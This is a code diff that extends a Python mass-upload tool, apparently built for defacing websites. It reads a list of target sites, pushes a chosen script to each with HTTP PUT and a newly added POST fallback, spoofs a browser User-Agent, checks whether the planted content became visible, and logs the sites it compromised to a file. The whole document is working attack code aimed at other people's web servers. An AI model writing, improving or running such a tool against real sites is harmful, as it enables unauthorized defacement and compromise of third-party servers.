@@ -6,8 +6,9 @@ try:
    import os.path
    import requests
    import threading
+   from urllib.parse import urlparse
 except ImportError:
-   exit("install requests and try again ...(pip install requests")
+   exit("install requests and try again ...(pip install requests)")
 os.system("git pull")
 os.system("clear")
 red    = "\033[31m"
@@ -60,12 +61,14 @@ banner = f"""
        github : https://github.com/zdecoder
 
 """+reset+blue
+
 def animate():
     text = "Uploading your script to websites..."
     while True:
         for i in range(len(text)):
             print(text[:i] + "_" + text[i+1:], end="\r")
             time.sleep(0.1)
+
 def eagle(tetew):
    ipt = ''
    if sys.version_info.major > 2:
@@ -73,36 +76,91 @@ def eagle(tetew):
    else:
       ipt = raw_input(tetew)   
    return str(ipt)
+
+def test_upload(s, site, script_content):
+    """Test berbagai metode upload dan verifikasi"""
+    methods = ['PUT', 'POST']
+    uploaded = False
+    
+    for method in methods:
+        try:
+            if method == 'PUT':
+                req = s.put(site, data=script_content, timeout=10)
+            elif method == 'POST':
+                req = s.post(site, data=script_content, timeout=10)
+            
+            # Cek jika upload berhasil (kode status 2xx)
+            if 200 <= req.status_code < 300:
+                # Verifikasi dengan melakukan GET request untuk memeriksa apakah konten berubah
+                time.sleep(1)  # Tunggu sebentar untuk memastikan perubahan tersimpan
+                verify_req = s.get(site, timeout=10)
+                
+                if script_content in verify_req.text:
+                    uploaded = True
+                    return True, method, "VERIFIED"
+                else:
+                    return True, method, "UPLOADED_BUT_NOT_VISIBLE"
+                    
+        except requests.exceptions.RequestException as e:
+            continue
+    
+    return False, "", "FAILED"
+
 def white(script, target_file="targets.txt"):
-    op = open(script, "r").read()
+    op = open(script, "r", encoding='utf-8', errors='ignore').read()
+    success_count = 0
+    total_count = 0
+    
     with open(target_file, "r") as target:
         target = target.readlines()
         s = requests.Session()
+        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
+        
         print(" ")
         print(green+bold+"[✓]\033[0m \033[34mUploading your script to %d website...." % (len(target)), end="", flush=True)
         print(" ")
+        
+        # Buat file untuk menyimpan hasil yang berhasil
+        success_file = open("success_sites.txt", "w")
+        
         t = threading.Thread(target=animate)
         t.daemon = True 
         t.start()                
+        
         for web in target:
             try:
                 site = web.strip()
-
+                total_count += 1
+                
+                # Gunakan HTTPS secara default
                 if site.startswith("http://"):
                     site = site.replace("http://", "https://", 1)
-                elif not site.startswith("https://"):
+                elif not site.startswith(("http://", "https://")):
                     site = "https://" + site
-
-                req = s.put(site, data=op)
-                if req.status_code < 200 or req.status_code >= 250:
-                    print(red + "[" + bold + " FAILED TO UPLOAD !\033[0m     " + red + " ] %s" % (site))
+                
+                # Coba upload dengan berbagai metode
+                success, method, status = test_upload(s, site, op)
+                
+                if success:
+                    success_count += 1
+                    if status == "VERIFIED":
+                        print(green + "[" + bold + " SUCCESS & VERIFIED ✓\033[0m" + green + " ] %s (%s)" % (site, method))
+                        success_file.write(site + " (VERIFIED)\n")
+                    else:
+                        print(yellow + "[" + bold + " UPLOADED BUT NOT VISIBLE ⚠\033[0m" + yellow + " ] %s (%s)" % (site, method))
+                        success_file.write(site + " (UPLOADED_BUT_NOT_VISIBLE)\n")
                 else:
-                    print(green + "[" + bold + " SUCCESSFULLY UPLOADED ✓\033[0m" + green + " ] %s" % (site))
-            except requests.exceptions.RequestException:
+                    print(red + "[" + bold + " FAILED TO UPLOAD !\033[0m     " + red + " ] %s" % (site))
+                    
+            except Exception as e:
+                print(red + "[" + bold + " ERROR !\033[0m     " + red + " ] %s - %s" % (site, str(e)))
                 continue
-            except KeyboardInterrupt:
-                print;
-                exit()
+        
+        success_file.close()
+        print(" ")
+        print(green + "[+] Total sites: %d, Success: %d, Failed: %d" % (total_count, success_count, total_count-success_count))
+        print(green + "[+] Successful sites saved to: success_sites.txt")
+
 def main(__bn__):
    print(__bn__)
    while True:
@@ -120,5 +178,6 @@ def main(__bn__):
       except KeyboardInterrupt:
          print; exit()
    white(a)
+
 if __name__ == "__main__":
     main(banner)
